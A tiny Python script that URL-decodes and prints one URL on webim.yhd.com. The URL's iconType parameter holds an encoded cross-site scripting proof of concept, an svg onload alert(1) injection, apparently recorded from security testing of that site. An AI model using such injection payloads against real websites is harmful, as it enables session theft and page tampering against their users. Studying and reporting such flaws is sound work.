import urllib.parse
str = "http://webim.yhd.com/checkPoint/showPoint/201949/1/0/0/3.action?isShake=1&jsonpCallback=jQuery111308362232538514871_1502718322764&elementId=expandWebIM&templateMainId=null&iconType=%3c%2fspan%3esmall%3Csvg%2fonload%3dalert(1)%3E%22"

de = urllib.parse.unquote(str)
print(de)